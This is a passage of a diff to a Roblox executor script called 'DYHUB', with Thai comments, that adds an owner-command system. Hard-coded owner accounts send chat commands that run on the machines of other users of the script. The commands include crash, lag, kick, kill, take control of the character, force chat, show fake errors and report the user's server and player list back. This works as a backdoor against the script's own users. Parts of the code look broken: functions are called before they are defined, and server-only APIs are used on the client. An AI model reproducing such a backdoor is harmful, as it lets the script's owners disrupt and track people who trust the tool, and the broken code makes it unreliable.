@@ -1,5 +1,22 @@
--- V594 | rebuild
+--																								   	[[
+
+		██████╗ ██╗   ██╗██╗   ██╗███╗   ███╗██████╗  █████╗  TM
+		██╔══██╗╚██╗ ██╔╝██║   ██║████╗ ████║██╔══██╗██╔══██╗
+		██║  ██║ ╚████╔╝ ██║   ██║██╔████╔██║██████╔╝███████║
+		██║  ██║  ╚██╔╝  ██║   ██║██║╚██╔╝██║██╔══██╗██╔══██║
+		██████╔╝   ██║   ╚██████╔╝██║ ╚═╝ ██║██║  ██║██║  ██║
+		╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                                                 
+                   dyumra.gg | owner & founder
+
+--																									]]
 if getgenv().DYHUB_Loader then
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "DYHUB",
+            Text = "Script already running. \nPlease rejoin to execute again.",
+            Duration = 5
+        })
+    end)
     return
 end
 getgenv().DYHUB_Loader = true
@@ -7,28 +24,56 @@ getgenv().DYHUB_Loader = true
 repeat task.wait() until game:IsLoaded()
 
 getgenv().owners = {"Yolmar_43", "55555555555555555455", "Kazorebere231"}
+
 local prefix = "."
 local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
 local localPlayer = Players.LocalPlayer
 
 local activeLoops = {}
 
--- Helper functions
+-- ========== Helper ==========
 local function starts_with(str, start)
     return string.lower(str):sub(1, #start) == string.lower(start)
 end
 
 local function findPlayersByName(query)
     local t = {}
-    query = string.lower(query or "")
-    for _, p in ipairs(Players:GetPlayers()) do
-        if query == "all" then
-            table.insert(t, p)
-        elseif starts_with(p.Name, query) then
-            table.insert(t, p)
+    if not query or query == "" then return t end
+    query = string.lower(query)
+
+    if query == "all" then
+        return Players:GetPlayers()
+    elseif query == "random" or query == "r" then
+        local all = Players:GetPlayers()
+        if #all > 0 then
+            return { all[math.random(1, #all)] }
         end
+        return t
+    elseif query == "me" or query == "self" then
+        return { localPlayer }
+    elseif query == "others" then
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= localPlayer then table.insert(t, p) end
+        end
+        return t
+    else
+        for _, p in ipairs(Players:GetPlayers()) do
+            if starts_with(p.Name, query) then
+                table.insert(t, p)
+            end
+        end
+        if #t == 0 then
+            for _, p in ipairs(Players:GetPlayers()) do
+                if string.find(string.lower(p.Name), query, 1, true) then
+                    table.insert(t, p)
+                end
+            end
+        end
+        return t
     end
-    return t
 end
 
 local function isOwner(player)
@@ -40,7 +85,449 @@ local function isOwner(player)
     return false
 end
 
--- ========== COMMAND FUNCTIONS ==========
+-- ========== Remote Setup ==========
+local RemoteName = "OwnerCommandRemote"
+
+local function getOrCreateRemote(rname)
+    local remote = game.ReplicatedStorage:FindFirstChild(rname)
+    if not remote then
+        remote = Instance.new("RemoteEvent")
+        remote.Name = rname
+        remote.Parent = game.ReplicatedStorage
+    end
+    return remote
+end
+
+local function getOrCreateFunc(rname)
+    local remote = game.ReplicatedStorage:FindFirstChild(rname)
+    if not remote then
+        remote = Instance.new("RemoteFunction")
+        remote.Name = rname
+        remote.Parent = game.ReplicatedStorage
+    end
+    return remote
+end
+
+local senderRemote   = getOrCreateRemote(RemoteName)
+local receiverRemote = getOrCreateRemote(RemoteName .. "_Receiver")
+local jobIdSender    = getOrCreateFunc("JobIdSender")
+local jobIdReceiver  = getOrCreateFunc("JobIdReceiver")
+local serverInfoSender  = getOrCreateFunc("ServerInfoSender")
+local serverInfoReceiver = getOrCreateFunc("ServerInfoReceiver")
+
+-- ฝั่งเพื่อน: ตอบ JobId เมื่อ owner ขอ
+jobIdReceiver.OnServerInvoke = function(requestingPlayer)
+    if requestingPlayer == localPlayer then return nil end
+    return {
+        GameId = game.PlaceId,
+        JobId  = game.JobId
+    }
+end
+
+-- ฝั่งเพื่อน: ตอบข้อมูลเซิร์ฟ (GameId, JobId, Players)
+serverInfoReceiver.OnServerInvoke = function(requestingPlayer)
+    if requestingPlayer == localPlayer then return nil end
+    local playerList = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        table.insert(playerList, p.Name)
+    end
+    return {
+        GameId  = game.PlaceId,
+        JobId   = game.JobId,
+        Players = playerList
+    }
+end
+
+-- ========== ฝั่งรับคำสั่ง (เพื่อน) ==========
+receiverRemote.OnClientEvent:Connect(function(cmd, arg1, arg2, arg3)
+    local targets = { localPlayer }
+    local ownerChar = localPlayer.Character
+
+    if     cmd == "bring"      then bring(ownerChar, targets)
+    elseif cmd == "kick"       then kick(targets, arg2)
+    elseif cmd == "freeze"     then freeze(targets)
+    elseif cmd == "unfreeze"   then unfreeze(targets)
+    elseif cmd == "kill"       then kill(targets)
+    elseif cmd == "sit"        then sit(targets)
+    elseif cmd == "void"       then void(targets)
+    elseif cmd == "spin"       then spin(targets, tonumber(arg2))
+    elseif cmd == "stopspin"   then activeLoops["spin_"..localPlayer.Name] = nil
+    elseif cmd == "float"      then floatPlayer(targets)
+    elseif cmd == "headbig"    then headBig(targets)
+    elseif cmd == "bighead"    then bigHead(targets)
+    elseif cmd == "tiny"       then tinyPlayer(targets)
+    elseif cmd == "explode"    then explodePlayer(targets)
+    elseif cmd == "ghost"      then ghostPlayer(targets)
+    elseif cmd == "fling"      then flingPlayer(targets)
+    elseif cmd == "launch"     then launchPlayer(targets)
+    elseif cmd == "randomtp"   then randomTeleport(targets)
+    elseif cmd == "invert"     then invertPlayer(targets)
+    elseif cmd == "invisible"  then invisiblePlayer(targets)
+    elseif cmd == "visible"    then visiblePlayer(targets)
+    elseif cmd == "fire"       then fireEffect(targets)
+    elseif cmd == "nofire"     then noFireEffect(targets)
+    elseif cmd == "ice"        then iceEffect(targets)
+    elseif cmd == "clonearmy"  then cloneArmy(targets)
+    elseif cmd == "removeclones" then removeClones(targets)
+    elseif cmd == "spinmyself" then spinMyself(ownerChar, targets, tonumber(arg2))
+    elseif cmd == "stopspinmyself" then activeLoops["spinMyself_"..localPlayer.Name] = nil
+    -- คำสั่งใหม่
+    elseif cmd == "jumpscare"  then jumpscare(targets, arg2)
+    elseif cmd == "gravity"    then changeGravity(targets, tonumber(arg2))
+    elseif cmd == "restoregravity" then restoreGravity()
+    elseif cmd == "nohand"     then noHand(targets)
+    elseif cmd == "annoy"      then annoy(targets, tonumber(arg2))
+    elseif cmd == "backflip"   then backflip(targets, tonumber(arg2))
+    elseif cmd == "stopbackflip" then activeLoops["backflip_"..localPlayer.Name] = nil
+    elseif cmd == "trail"      then addTrail(targets, arg2)
+    elseif cmd == "removetrail" then removeTrail(targets)
+    elseif cmd == "particles"  then addParticles(targets, arg2)
+    elseif cmd == "removeparticles" then removeParticles(targets)
+    elseif cmd == "music"      then playMusic(targets, arg2)
+    elseif cmd == "stopmusic"  then stopMusic(targets)
+    elseif cmd == "chat"       then forceChat(targets, arg2)
+    elseif cmd == "crash"      then crashPlayer(targets, tonumber(arg2))
+    elseif cmd == "control"    then controlPlayer(targets)
+    elseif cmd == "uncontrol"  then activeLoops["control_"..localPlayer.Name] = nil
+    elseif cmd == "shake"      then shakeScreen(targets, tonumber(arg2))
+    elseif cmd == "stopshake"  then activeLoops["shake_"..localPlayer.Name] = nil
+    elseif cmd == "skybox"     then changeSkybox(targets, arg2)
+    elseif cmd == "restoresky" then restoreSkybox()
+    elseif cmd == "walkspeed"  then changeWalkSpeed(targets, tonumber(arg2))
+    elseif cmd == "jumppower"  then changeJumpPower(targets, tonumber(arg2))
+    elseif cmd == "resize"     then resizePlayer(targets, tonumber(arg2))
+    elseif cmd == "resizehead" then resizeHead(targets, tonumber(arg2))
+    elseif cmd == "flinghigh"  then flingHigh(targets, tonumber(arg2))
+    elseif cmd == "bounce"     then bouncePlayer(targets, tonumber(arg2))
+    elseif cmd == "stopbounce" then activeLoops["bounce_"..localPlayer.Name] = nil
+    elseif cmd == "rain"       then rainParts(targets, arg2)
+    elseif cmd == "blackhole"  then blackHole(targets, tonumber(arg2))
+    elseif cmd == "stopblackhole" then activeLoops["blackhole_"..localPlayer.Name] = nil
+    elseif cmd == "disco"      then discoMode(targets, tonumber(arg2))
+    elseif cmd == "stopdisco"  then activeLoops["disco_"..localPlayer.Name] = nil
+    elseif cmd == "earthquake" then earthquake(targets, tonumber(arg2))
+    elseif cmd == "stopeq"     then activeLoops["earthquake_"..localPlayer.Name] = nil
+    elseif cmd == "lag"        then lagPlayer(targets, tonumber(arg2))
+    elseif cmd == "tpback"     then tpBack(localPlayer)
+    elseif cmd == "fakeerror"  then fakeError(targets)
+    elseif cmd == "rejoin"     then rejoinPlayer(targets)
+    elseif cmd == "fakemessage" then fakeMessage(targets, arg2)
+    elseif cmd == "dizzy"      then dizzy(targets, tonumber(arg2))
+    elseif cmd == "stopdizzy"  then activeLoops["dizzy_"..localPlayer.Name] = nil
+    elseif cmd == "nuke"       then nuke(targets)
+    elseif cmd == "rocket"     then rocketPlayer(targets)
+    elseif cmd == "flash"      then flashScreen(targets, tonumber(arg2))
+    end
+end)
+
+-- ========== ฝั่งส่งคำสั่ง (owner) ==========
+local function handleCommand(msg)
+    if not isOwner(localPlayer) then return end
+
+    local parts = string.split(msg, " ")
+    local cmd   = string.lower(parts[1] or "")
+    local arg1  = parts[2]
+    local arg2  = table.concat(parts, " ", 3) -- เก็บข้อความยาวๆ สำหรับ chat/music
+
+    -- ========== .jq (Teleport ไปเซิร์ฟเพื่อน) ==========
+    if cmd == prefix.."jq" then
+        local targetQuery = arg1
+
+        -- ถ้าไม่ใส่ชื่อ -> random
+        if not targetQuery or targetQuery == "" or targetQuery == "random" or targetQuery == "r" then
+            -- ขอข้อมูลจากทุกคนในเกม
+            local serverList = {}
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= localPlayer then
+                    local ok, info = pcall(function()
+                        return serverInfoSender:InvokeServer(p)
+                    end)
+                    if ok and info then
+                        table.insert(serverList, {player = p, info = info})
+                    end
+                end
+            end
+
+            if #serverList == 0 then
+                warn("[JQ] No target are running the script in this place.")
+                return
+            end
+
+            -- เลือก random
+            local pick = serverList[math.random(1, #serverList)]
+            local ok, err = pcall(function()
+                TeleportService:TeleportToPlaceInstance(
+                    pick.info.GameId,
+                    pick.info.JobId,
+                    localPlayer
+                )
+            end)
+            if ok then
+                print("[JQ] Teleporting to " .. pick.player.Name .. "'s server...")
+            else
+                warn("[JQ] Failed: " .. tostring(err))
+            end
+            return
+        end
+
+        -- ถ้าใส่ชื่อ
+        local targetPlayer = nil
+        for _, p in ipairs(Players:GetPlayers()) do
+            if starts_with(p.Name, targetQuery) or string.find(string.lower(p.Name), string.lower(targetQuery), 1, true) then
+                targetPlayer = p
+                break
+            end
+        end
+
+        if not targetPlayer then
+            warn("[JQ] Player not found: " .. tostring(targetQuery))
+            return
+        end
+
+        local ok, result = pcall(function()
+            return jobIdSender:InvokeServer(targetPlayer)
+        end)
+
+        if ok and result then
+            local ok2, err = pcall(function()
+                TeleportService:TeleportToPlaceInstance(
+                    result.GameId,
+                    result.JobId,
+                    localPlayer
+                )
+            end)
+            if ok2 then
+                print("[JQ] Teleporting to " .. targetPlayer.Name .. "'s server...")
+            else
+                warn("[JQ] Failed: " .. tostring(err))
+            end
+        else
+            warn("[JQ] Cannot get server")
+        end
+        return
+    end
+
+    -- ========== .help ==========
+    if cmd == prefix.."help" then
+        print("========================================")
+        print("       OWNER COMMAND HELP")
+        print("========================================")
+        print("[CMD]  1 | .bring <name/all/random>            - ดึงเพื่อนมาหาฉัน")
+        print("[CMD]  2 | .kick <name/all/random> [reason]     - เตะเพื่อนออก")
+        print("[CMD]  3 | .freeze <name/all/random>           - แช่แข็ง")
+        print("[CMD]  4 | .unfreeze <name/all/random>         - ปลดแช่แข็ง")
+        print("[CMD]  5 | .kill <name/all/random>             - ฆ่า")
+        print("[CMD]  6 | .sit <name/all/random>              - นั่ง")
+        print("[CMD]  7 | .void <name/all/random>             - ทิ้งลงเหว")
+        print("[CMD]  8 | .spin <name/all/random> [speed]     - หมุนตัว")
+        print("[CMD]  9 | .stopspin <name/all/random>         - หยุดหมุน")
+        print("[CMD] 10 | .float <name/all/random>            - ลอยขึ้น")
+        print("[CMD] 11 | .headbig <name/all/random>          - หัวใหญ่")
+        print("[CMD] 12 | .bighead <name/all/random>          - หัวใหญ่มาก")
+        print("[CMD] 13 | .tiny <name/all/random>             - ตัวเล็ก")
+        print("[CMD] 14 | .explode <name/all/random>          - ระเบิด")
+        print("[CMD] 15 | .ghost <name/all/random>            - กลายเป็นผี")
+        print("[CMD] 16 | .fling <name/all/random>            - เหวี่ยง")
+        print("[CMD] 17 | .launch <name/all/random>           - ยิงขึ้นฟ้า")
+        print("[CMD] 18 | .flinghigh <name/all> [power]       - เหวี่ยงแรงสุดๆ")
+        print("[CMD] 19 | .randomtp <name/all/random>         - สุ่มวาร์ป")
+        print("[CMD] 20 | .invert <name/all/random>           - กลับหัว")
+        print("[CMD] 21 | .invisible <name/all/random>        - ล่องหน")
+        print("[CMD] 22 | .visible <name/all/random>          - กลับมาเห็นได้")
+        print("[CMD] 23 | .fire <name/all/random>             - จุดไฟ")
+        print("[CMD] 24 | .nofire <name/all/random>           - ดับไฟ")
+        print("[CMD] 25 | .ice <name/all/random>              - น้ำแข็ง + แช่แข็ง")
+        print("[CMD] 26 | .clonearmy <name/all/random>        - โคลน 10 ตัว")
+        print("[CMD] 27 | .removeclones <name/all/random>     - ลบโคลน")
+        print("[CMD] 28 | .spinmyself <name/all> [speed]      - หมุนรอบฉัน")
+        print("[CMD] 29 | .stopspinmyself <name/all>          - หยุด")
+        print("[CMD] 30 | .jumpscare <name/all>               - เด้งผีหลอก")
+        print("[CMD] 31 | .gravity <name/all> [value]         - เปลี่ยนแรงโน้มถ่วง")
+        print("[CMD] 32 | .restoregravity                     - คืนค่าแรงโน้มถ่วง")
+        print("[CMD] 33 | .nohand <name/all/random>           - ลบมือ + อาวุธ")
+        print("[CMD] 34 | .annoy <name/all/random> [times]    - เจ็บเรื่อยๆ")
+        print("[CMD] 35 | .backflip <name/all> [speed]        - หมุนหลัง")
+        print("[CMD] 36 | .stopbackflip <name/all>            - หยุด backflip")
+        print("[CMD] 37 | .trail <name/all> <color>           - ใส่ trail (red/blue/yellow)")
+        print("[CMD] 38 | .removetrail <name/all>             - ลบ trail")
+        print("[CMD] 39 | .particles <name/all>               - ใส่ particle")
+        print("[CMD] 40 | .removeparticles <name/all>         - ลบ particle")
+        print("[CMD] 41 | .music <name/all> [soundid]         - เล่นเพลง")
+        print("[CMD] 42 | .stopmusic <name/all>               - หยุดเพลง")
+        print("[CMD] 43 | .chat <name/all> <message>          - บังคับพูด")
+        print("[CMD] 44 | .crash <name/all> [level]           - ทำให้ค้าง/หลุด")
+        print("[CMD] 45 | .control <name/all>                 - ควบคุมตัวละคร")
+        print("[CMD] 46 | .uncontrol <name/all>               - ปลดควบคุม")
+        print("[CMD] 47 | .shake <name/all> [power]           - สั่นหน้าจอ")
+        print("[CMD] 48 | .stopshake <name/all>               - หยุดสั่น")
+        print("[CMD] 49 | .skybox <name/all> [id]             - เปลี่ยนท้องฟ้า")
+        print("[CMD] 50 | .restoresky                         - คืนค่าท้องฟ้า")
+        print("[CMD] 51 | .walkspeed <name/all> [speed]       - เปลี่ยนความเร็วเดิน")
+        print("[CMD] 52 | .jumppower <name/all> [power]       - เปลี่ยนพลังกระโดด")
+        print("[CMD] 53 | .resize <name/all> [scale]          - ย่อ/ขยายตัว")
+        print("[CMD] 54 | .resizehead <name/all> [size]       - ย่อ/ขยายหัว")
+        print("[CMD] 55 | .bounce <name/all> [power]          - เด้งไม่หยุด")
+        print("[CMD] 56 | .stopbounce <name/all>              - หยุดเด้ง")
+        print("[CMD] 57 | .rain <name/all> <type>             - ฝนตก (fire/ice/rock)")
+        print("[CMD] 58 | .blackhole <name/all> [power]       - หลุมดำ")
+        print("[CMD] 59 | .stopblackhole <name/all>           - หยุด")
+        print("[CMD] 60 | .disco <name/all> [speed]           - ไฟดิสโก้")
+        print("[CMD] 61 | .stopdisco <name/all>               - หยุดดิสโก้")
+        print("[CMD] 62 | .earthquake <name/all> [power]      - แผ่นดินไหว")
+        print("[CMD] 63 | .stopeq <name/all>                  - หยุดแผ่นดินไหว")
+        print("[CMD] 64 | .lag <name/all> [level]             - ทำให้ lag")
+        print("[CMD] 65 | .tpback <name/all>                  - กลับจุดเดิม")
+        print("[CMD] 66 | .fakeerror <name/all>               - แกล้ง error")
+        print("[CMD] 67 | .rejoin <name/all>                  - บังคับรีโจน")
+        print("[CMD] 68 | .fakemessage <name/all> <msg>       - แกล้งข้อความ")
+        print("[CMD] 69 | .dizzy <name/all> [power]           - เวียนหัว")
+        print("[CMD] 70 | .stopdizzy <name/all>               - หยุดเวียนหัว")
+        print("[CMD] 71 | .nuke <name/all>                    - ระเบิดนิวเคลียร์")
+        print("[CMD] 72 | .rocket <name/all>                  - ยิงจรวด")
+        print("[CMD] 73 | .flash <name/all> [power]           - แสงแฟลช")
+        print("[CMD] 74 | .jq <name/random>                   - ไปเซิร์ฟเพื่อน")
+        print("[CMD] 75 | .help                               - แสดงคำสั่งทั้งหมด")
+        print("========================================")
+		print("Note: <name> can use abbreviations, e.g., .kill Ro = .kill Roblox")
+        print("Special commands: all = everyone, random/r = random 1 person, me = yourself")
+        return
+    end
+
+    -- ========== คำสั่งอื่นๆ ==========
+    local pureCmd = string.sub(cmd, #prefix + 1)
+    local ownerChar = localPlayer.Character
+    local targets   = arg1 and findPlayersByName(arg1) or {}
+
+    -- คำสั่งที่ไม่ต้องมี target
+    local noTargetCmds = {
+        restoregravity = true,
+        restoresky     = true
+    }
+
+    if noTargetCmds[pureCmd] then
+        -- รัน local
+        if     pureCmd == "restoregravity" then restoreGravity()
+        elseif pureCmd == "restoresky"     then restoreSkybox()
+        end
+        -- ส่งให้เพื่อนทุกคน
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= localPlayer then
+                senderRemote:FireClient(plr, pureCmd, arg1, arg2)
+            end
+        end
+        return
+    end
+
+    if #targets == 0 then
+        warn("[CMD] Can't find the target: " .. tostring(arg1))
+        return
+    end
+
+    local function runLocal()
+        if     pureCmd == "bring"     then bring(ownerChar, targets)
+        elseif pureCmd == "kick"      then kick(targets, arg2)
+        elseif pureCmd == "freeze"    then freeze(targets)
+        elseif pureCmd == "unfreeze"  then unfreeze(targets)
+        elseif pureCmd == "kill"      then kill(targets)
+        elseif pureCmd == "sit"       then sit(targets)
+        elseif pureCmd == "void"      then void(targets)
+        elseif pureCmd == "spin"      then spin(targets, tonumber(arg2))
+        elseif pureCmd == "stopspin"  then
+            for _, plr in ipairs(targets) do activeLoops["spin_"..plr.Name] = nil end
+        elseif pureCmd == "float"     then floatPlayer(targets)
+        elseif pureCmd == "headbig"   then headBig(targets)
+        elseif pureCmd == "bighead"   then bigHead(targets)
+        elseif pureCmd == "tiny"      then tinyPlayer(targets)
+        elseif pureCmd == "explode"   then explodePlayer(targets)
+        elseif pureCmd == "ghost"     then ghostPlayer(targets)
+        elseif pureCmd == "fling"     then flingPlayer(targets)
+        elseif pureCmd == "launch"    then launchPlayer(targets)
+        elseif pureCmd == "flinghigh" then flingHigh(targets, tonumber(arg2))
+        elseif pureCmd == "randomtp"  then randomTeleport(targets)
+        elseif pureCmd == "invert"    then invertPlayer(targets)
+        elseif pureCmd == "invisible" then invisiblePlayer(targets)
+        elseif pureCmd == "visible"   then visiblePlayer(targets)
+        elseif pureCmd == "fire"      then fireEffect(targets)
+        elseif pureCmd == "nofire"    then noFireEffect(targets)
+        elseif pureCmd == "ice"       then iceEffect(targets)
+        elseif pureCmd == "clonearmy" then cloneArmy(targets)
+        elseif pureCmd == "removeclones" then removeClones(targets)
+        elseif pureCmd == "spinmyself" then spinMyself(ownerChar, targets, tonumber(arg2))
+        elseif pureCmd == "stopspinmyself" then
+            for _, plr in ipairs(targets) do activeLoops["spinMyself_"..plr.Name] = nil end
+        elseif pureCmd == "jumpscare"  then jumpscare(targets, arg2)
+        elseif pureCmd == "gravity"    then changeGravity(targets, tonumber(arg2))
+        elseif pureCmd == "nohand"     then noHand(targets)
+        elseif pureCmd == "annoy"      then annoy(targets, tonumber(arg2))
+        elseif pureCmd == "backflip"   then backflip(targets, tonumber(arg2))
+        elseif pureCmd == "stopbackflip" then
+            for _, plr in ipairs(targets) do activeLoops["backflip_"..plr.Name] = nil end
+        elseif pureCmd == "trail"      then addTrail(targets, arg2)
+        elseif pureCmd == "removetrail" then removeTrail(targets)
+        elseif pureCmd == "particles"  then addParticles(targets, arg2)
+        elseif pureCmd == "removeparticles" then removeParticles(targets)
+        elseif pureCmd == "music"      then playMusic(targets, arg2)
+        elseif pureCmd == "stopmusic"  then stopMusic(targets)
+        elseif pureCmd == "chat"       then forceChat(targets, arg2)
+        elseif pureCmd == "crash"      then crashPlayer(targets, tonumber(arg2))
+        elseif pureCmd == "control"    then controlPlayer(targets)
+        elseif pureCmd == "uncontrol"  then
+            for _, plr in ipairs(targets) do activeLoops["control_"..plr.Name] = nil end
+        elseif pureCmd == "shake"      then shakeScreen(targets, tonumber(arg2))
+        elseif pureCmd == "stopshake"  then
+            for _, plr in ipairs(targets) do activeLoops["shake_"..plr.Name] = nil end
+        elseif pureCmd == "skybox"     then changeSkybox(targets, arg2)
+        elseif pureCmd == "walkspeed"  then changeWalkSpeed(targets, tonumber(arg2))
+        elseif pureCmd == "jumppower"  then changeJumpPower(targets, tonumber(arg2))
+        elseif pureCmd == "resize"     then resizePlayer(targets, tonumber(arg2))
+        elseif pureCmd == "resizehead" then resizeHead(targets, tonumber(arg2))
+        elseif pureCmd == "bounce"     then bouncePlayer(targets, tonumber(arg2))
+        elseif pureCmd == "stopbounce" then
+            for _, plr in ipairs(targets) do activeLoops["bounce_"..plr.Name] = nil end
+        elseif pureCmd == "rain"       then rainParts(targets, arg2)
+        elseif pureCmd == "blackhole"  then blackHole(targets, tonumber(arg2))
+        elseif pureCmd == "stopblackhole" then
+            for _, plr in ipairs(targets) do activeLoops["blackhole_"..plr.Name] = nil end
+        elseif pureCmd == "disco"      then discoMode(targets, tonumber(arg2))
+        elseif pureCmd == "stopdisco"  then
+            for _, plr in ipairs(targets) do activeLoops["disco_"..plr.Name] = nil end
+        elseif pureCmd == "earthquake" then earthquake(targets, tonumber(arg2))
+        elseif pureCmd == "stopeq"     then
+            for _, plr in ipairs(targets) do activeLoops["earthquake_"..plr.Name] = nil end
+        elseif pureCmd == "lag"        then lagPlayer(targets, tonumber(arg2))
+        elseif pureCmd == "tpback"     then tpBack(targets[1])
+        elseif pureCmd == "fakeerror"  then fakeError(targets)
+        elseif pureCmd == "rejoin"     then rejoinPlayer(targets)
+        elseif pureCmd == "fakemessage" then fakeMessage(targets, arg2)
+        elseif pureCmd == "dizzy"      then dizzy(targets, tonumber(arg2))
+        elseif pureCmd == "stopdizzy"  then
+            for _, plr in ipairs(targets) do activeLoops["dizzy_"..plr.Name] = nil end
+        elseif pureCmd == "nuke"       then nuke(targets)
+        elseif pureCmd == "rocket"     then rocketPlayer(targets)
+        elseif pureCmd == "flash"      then flashScreen(targets, tonumber(arg2))
+        end
+    end
+
+    local hasSelf = false
+    for _, plr in ipairs(targets) do
+        if plr == localPlayer then hasSelf = true; break end
+    end
+    if hasSelf then runLocal() end
+
+    for _, plr in ipairs(targets) do
+        if plr ~= localPlayer then
+            senderRemote:FireClient(plr, pureCmd, arg1, arg2)
+        end
+    end
+end
+
+localPlayer.Chatted:Connect(handleCommand)
+
+-- ============================================================
+-- COMMAND FUNCTIONS
+-- ============================================================
+
+local savedPositions = {} -- เก็บตำแหน่งเดิมสำหรับ tpback
 
 local function bring(ownerChar, targets)
     if not ownerChar or not ownerChar.PrimaryPart then return end
@@ -138,6 +625,14 @@ local function headBig(targets)
     end
 end
 
+local function bigHead(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChild("Head") then
+            plr.Character.Head.Size = Vector3.new(15, 15, 15)
+        end
+    end
+end
+
 local function tinyPlayer(targets)
     for _, plr in ipairs(targets) do
         if plr.Character then
@@ -168,6 +663,18 @@ local function ghostPlayer(targets)
     end
 end
 
+local function visiblePlayer(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character then
+            for _, part in ipairs(plr.Character:GetChildren()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.Transparency = 0
+                end
+            end
+        end
+    end
+end
+
 local function flingPlayer(targets)
     for _, plr in ipairs(targets) do
         if plr.Character and plr.Character.PrimaryPart then
@@ -178,6 +685,26 @@ local function flingPlayer(targets)
                 bodyVel.Parent = plr.Character.PrimaryPart
                 task.wait(3)
                 bodyVel:Destroy()
+            end)
+        end
+    end
+end
+
+local function flingHigh(targets, power)
+    power = power or 1000
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            spawn(function()
+                local bv = Instance.new("BodyVelocity")
+                bv.Velocity = Vector3.new(
+                    math.random(-power, power),
+                    power,
+                    math.random(-power, power)
+                )
+                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                bv.Parent = plr.Character.PrimaryPart
+                task.wait(2)
+                bv:Destroy()
             end)
         end
     end
@@ -222,7 +749,9 @@ local function invisiblePlayer(targets)
     for _, plr in ipairs(targets) do
         if plr.Character then
             for _, part in ipairs(plr.Character:GetChildren()) do
-                if part:IsA("BasePart") then part.Transparency = 1 end
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.Transparency = 1
+                end
             end
         end
     end
@@ -231,8 +760,21 @@ end
 local function fireEffect(targets)
     for _, plr in ipairs(targets) do
         if plr.Character and plr.Character.PrimaryPart then
+            for _, f in ipairs(plr.Character.PrimaryPart:GetChildren()) do
+                if f:IsA("Fire") then f:Destroy() end
+            end
             local fire = Instance.new("Fire", plr.Character.PrimaryPart)
             fire.Size = 20
+        end
+    end
+end
+
+local function noFireEffect(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            for _, f in ipairs(plr.Character.PrimaryPart:GetChildren()) do
+                if f:IsA("Fire") then f:Destroy() end
+            end
         end
     end
 end
@@ -263,6 +805,14 @@ local function cloneArmy(targets)
     end
 end
 
+local function removeClones(targets)
+    for _, obj in ipairs(workspace:GetChildren()) do
+        if obj:IsA("Model") and not Players:GetPlayerFromCharacter(obj) then
+            obj:Destroy()
+        end
+    end
+end
+
 local function spinMyself(ownerChar, targets, speed)
     if not ownerChar or not ownerChar.PrimaryPart then return end
     for _, plr in ipairs(targets) do
@@ -284,51 +834,587 @@ local function spinMyself(ownerChar, targets, speed)
     end
 end
 
--- ========== COMMAND HANDLER ==========
+-- ============ NEW COMMANDS ============
 
-local function handleCommand(msg)
-    -- ✅ ฟังแค่ LocalPlayer แล้วเช็คว่าเป็น owner ไหม
-    if not isOwner(localPlayer) then return end
+local function jumpscare(targets, assetId)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChild("Head") then
+            local dummy = Instance.new("Part")
+            dummy.Anchored = true
+            dummy.CanCollide = false
+            dummy.Size = Vector3.new(2, 2, 2)
+            dummy.Parent = workspace
+            dummy.CFrame = plr.Character.Head.CFrame * CFrame.new(0, 0, -3)
 
-    local parts = string.split(msg, " ")
-    local cmd   = string.lower(parts[1] or "")
-    local arg1  = parts[2]
-    local arg2  = parts[3]
+            local face = Instance.new("Decal")
+            face.Face = Enum.NormalId.Front
+            face.Texture = "rbxassetid://" .. (assetId or "6676230995")
+            face.Parent = dummy
 
-    local ownerChar = localPlayer.Character
-    local targets   = arg1 and findPlayersByName(arg1) or {}
-
-    if     cmd == prefix.."bring"     then bring(ownerChar, targets)
-    elseif cmd == prefix.."kick"      then kick(targets)
-    elseif cmd == prefix.."freeze"    then freeze(targets)
-    elseif cmd == prefix.."unfreeze"  then unfreeze(targets)
-    elseif cmd == prefix.."kill"      then kill(targets)
-    elseif cmd == prefix.."sit"       then sit(targets)
-    elseif cmd == prefix.."void"      then void(targets)
-    elseif cmd == prefix.."spin"      then spin(targets, tonumber(arg2))
-    elseif cmd == prefix.."float"     then floatPlayer(targets)
-    elseif cmd == prefix.."headbig"   then headBig(targets)
-    elseif cmd == prefix.."tiny"      then tinyPlayer(targets)
-    elseif cmd == prefix.."explode"   then explodePlayer(targets)
-    elseif cmd == prefix.."ghost"     then ghostPlayer(targets)
-    elseif cmd == prefix.."fling"     then flingPlayer(targets)
-    elseif cmd == prefix.."launch"    then launchPlayer(targets)
-    elseif cmd == prefix.."randomtp"  then randomTeleport(targets)
-    elseif cmd == prefix.."invert"    then invertPlayer(targets)
-    elseif cmd == prefix.."invisible" then invisiblePlayer(targets)
-    elseif cmd == prefix.."fire"      then fireEffect(targets)
-    elseif cmd == prefix.."ice"       then iceEffect(targets)
-    elseif cmd == prefix.."clonearmy" then cloneArmy(targets)
-    elseif cmd == prefix.."spinmyself" then spinMyself(ownerChar, targets, tonumber(arg2))
-    elseif cmd == prefix.."stopspin"  then
-        for _, plr in ipairs(targets) do
-            activeLoops["spin_"..plr.Name] = nil
-            activeLoops["spinMyself_"..plr.Name] = nil
+            task.delay(1.5, function() dummy:Destroy() end)
         end
     end
 end
 
-localPlayer.Chatted:Connect(handleCommand)
+local originalGravity = workspace.Gravity
+local function changeGravity(targets, gravity)
+    workspace.Gravity = gravity or 50
+end
+local function restoreGravity()
+    workspace.Gravity = originalGravity
+end
+
+local function noHand(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character then
+            for _, part in ipairs(plr.Character:GetChildren()) do
